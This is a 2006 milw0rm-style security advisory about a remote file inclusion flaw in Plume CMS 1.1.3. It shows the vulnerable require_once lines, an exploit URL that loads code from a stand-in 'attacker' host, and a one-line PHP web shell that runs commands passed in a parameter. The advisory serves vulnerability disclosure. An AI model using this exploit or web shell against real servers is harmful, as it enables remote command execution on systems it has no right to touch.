@@ -1,0 +1,57 @@
+/*------------------------------------------------
+               IHS Public advisory
+-------------------------------------------------*/
+
+Plume CMS Remote File Inclusion
+
+It uses PHP and MySql. With a single installation of
+Plume you can have
+multiple websites, file management, multiple authors
+with different rights and websites in any languages
+thanks to a full utf-8 support.
+Plume CMS proposes a flexible plugin infrastructure to
+extend it and is fully accessible with output
+providing standard compliant code by default.
+http://plume-cms.net
+
+
+Discovered by Hamid Ebadi
+Credit : all go to IHS team (IHS : IRAN HOMELAND SECURITY)
+www.ihsteam.com (persian)
+www.ihsteam.net (english)
+
+
+The original article can be found at:
+http://www.hamid.ir/security/
+http://www.IHSteam.com
+
+Vulnerable Systems:
+       Plume CMS 1.1.3
+
+
+Vulnerable Code :
+
+[path]/plume-1.1.3/plume/manager/tools/link/dbinstall.php //Vulnerable Code :line 39
+require_once $_PX_config['manager_path'].'/inc/class.checklist.php';
+require_once $_PX_config['manager_path'].'/extinc/class.xmlsql.php';
+
+
+
+Exploits:
+
+The following URL will cause the server to include external files
+http://localhost/plume-1.1.3/manager/tools/link/dbinstall.php?cmd=ls -al&_PX_config[manager_path]=http://attacker/cmd.gif?
+
+cmd.gif
+<?
+passthru($_GET['cmd']);
+?>
+
+Solution:
+Edit the source code to ensure that input is properly
+verified.
+
+greeting :
+LorD , NT , C0d3r of IHS
+
+# milw0rm.com [2006-07-01]
